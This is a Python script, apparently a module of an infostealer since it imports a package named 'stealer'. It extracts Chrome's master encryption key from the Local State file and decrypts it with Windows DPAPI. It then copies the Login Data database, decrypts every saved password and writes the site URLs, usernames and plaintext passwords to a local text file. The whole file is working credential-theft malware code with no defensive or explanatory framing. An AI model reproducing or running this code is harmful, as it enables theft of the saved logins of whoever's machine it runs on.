import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import stealer

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                "AppData", "Local","Google",
                                "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r", encoding='utf-8') as f:
        loacal_state = f.read()
        loacal_state = json.loads(loacal_state)

    key = base64.b64decode(loacal_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None,None,0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM ,iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        

def get_chrome_datetim(chrome_data):
    return datetime(1601, 1,1) + timedelta(microseconds=chrome_data)

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"],"AppData","Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value,"
                   "password_value FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        if username or password:
            stealer.write_to_file("C:\\Min\\GoogleChr\\passwords.txt", origin_url, action_url, username, password)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
